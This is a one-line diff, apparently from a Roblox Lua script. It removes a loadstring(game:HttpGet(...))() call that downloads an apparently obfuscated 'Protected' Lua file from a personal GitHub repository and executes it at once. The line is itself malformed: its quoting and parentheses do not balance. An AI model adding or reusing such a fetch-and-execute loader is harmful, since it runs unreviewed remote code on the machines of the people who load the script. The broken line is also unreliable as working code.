@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/castyhwprivateez/v1.6666666-w..ww..what-/main/Protected%20(46).lua%22)))()
